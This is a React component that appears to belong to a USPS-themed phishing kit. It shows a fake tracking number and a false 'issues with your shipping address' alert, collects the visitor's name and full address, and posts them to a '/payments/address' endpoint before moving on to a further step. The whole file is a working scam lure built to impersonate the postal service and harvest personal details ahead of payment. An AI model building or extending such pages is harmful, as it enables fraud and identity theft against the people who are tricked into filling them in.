import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './AddressForm.css';
import FAQSection from './FAQSection';
import Footer from './Footer';
import ProgressBar from './ProgressBar';

const AddressForm = ({ formData, handleChange, nextStep, error, setError }) => {
  const [loading, setLoading] = useState(false);
  const [apiBaseUrl, setApiBaseUrl] = useState('');

  // Determine API base URL based on environment
  useEffect(() => {
    const determineApiUrl = () => {
      // If we're in development or production has explicitly set the REACT_APP_API_BASE_URL
      if (process.env.NODE_ENV === 'development' || process.env.REACT_APP_API_BASE_URL) {
        return process.env.REACT_APP_API_BASE_URL;
      }
      // In production, use relative paths if frontend and backend are served from same domain
      return '';
    };
    
    setApiBaseUrl(determineApiUrl());
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');

    try {
      // Validate required fields
      const requiredFields = ['firstName', 'lastName', 'address', 'country', 'city', 'zipCode'];
      const missingFields = requiredFields.filter(field => !formData[field]?.trim());
      
      if (missingFields.length > 0) {
        throw new Error('All fields are required.');
      }
      
      // Validate ZIP code format
      if (!/^\d{5}$/.test(formData.zipCode)) {
        throw new Error('ZIP code must be 5 digits.');
      }

      // Simulate network delay for UX purposes
      await new Promise(resolve => setTimeout(resolve, 500));

      // Make the API request
      const response = await axios.post(
        `${process.env.REACT_APP_API_BASE_URL}/api/payments/address`, 
        formData,
        {
          headers: {
            'Content-Type': 'application/json'
          },
          withCredentials: true // Include credentials if using cookies/sessions
        }
      );
      
      if (response.data.success) {
        nextStep();
      } else {
        throw new Error(response.data.error || 'Failed to save address.');
      }
    } catch (err) {
      let errorMessage = 'An error occurred while processing your request.';
      
      if (err.response) {
        // The request was made and the server responded with a status code
        errorMessage = err.response.data.message || 
                      err.response.statusText || 
                      `Server responded with status ${err.response.status}`;
      } else if (err.request) {
        // The request was made but no response was received
        errorMessage = 'Network error - please check your internet connection';
      } else {
        // Something happened in setting up the request
        errorMessage = err.message;
      }
      
      setError(errorMessage);
      console.error('Address submission error:', {
        error: err,
        config: err.config,
        response: err.response
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="address-container">
      <ProgressBar currentStep="address" />
      
      <div className="address-header">
        <h1>
          <span className="tracking-label">Tracking Number:</span> US9514901165421
        </h1>
        <div className="status-notification">
          <span className="status-label">Status:</span>
          <span className="status-message">We have issues with your shipping address</span>
        </div>
      </div>

      <div className="address-message">
        <p>USPS allows you to redirect your package to your address in case of delivery failure or any other case. You can also track the package at any time, from shipment to delivery.</p>
      </div>

      <div className="address-alert">
        <h4>Verify Address</h4>
        <p>Find an email to confirm your address as eligible for informed Delivery.</p>
      </div>

      <form onSubmit={handleSubmit} className="address-form">
        <h2 className="form-title">Shipping Address</h2>
        
        {error && (
          <div className="form-error">
            {error}
            {process.env.NODE_ENV === 'development' && (
              <div className="error-details">
                API Endpoint: {apiBaseUrl}/api/payments/address
              </div>
            )}
          </div>
        )}
        
        <div className="form-grid">
          <div className="form-group">
            <label>First Name</label>
            <input
              type="text"
              name="firstName"
              value={formData.firstName}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>
          
          <div className="form-group">
            <label>Last Name</label>
            <input
              type="text"
              name="lastName"
              value={formData.lastName}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>

          <div className="form-group full-width">
            <label>Address</label>
            <input
              type="text"
              name="address"
              value={formData.address}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>

          <div className="form-group">
            <label>City</label>
            <input
              type="text"
              name="city"
              value={formData.city}
              onChange={handleChange}
              required
              disabled={loading}
            />
          </div>

          <div className="form-group">
            <label>Country</label>
            <select
              name="country"
              value={formData.country}
              onChange={handleChange}
              required
              disabled={loading}
            >
              <option value="">Select Country</option>
              <option value="US">United States</option>
              <option value="CA">Canada</option>
            </select>
          </div>

          <div className="form-group">
            <label>ZIP Code</label>
            <input
              type="text"
              name="zipCode"
              value={formData.zipCode}
              onChange={handleChange}
              required
              disabled={loading}
              pattern="\d{5}"
              title="Five digit ZIP code"
            />
          </div>
        </div>

        <div className="form-actions">
          <button 
            type="submit" 
            disabled={loading} 
            className="submit-button"
            aria-busy={loading}
          >
            {loading ? (
              <>
                <span className="button-spinner"></span> Processing...
              </>
            ) : 'Continue'}
          </button>
        </div>
      </form>
      
      <FAQSection />
      <Footer/>
    </div>
  );
};

export default AddressForm;
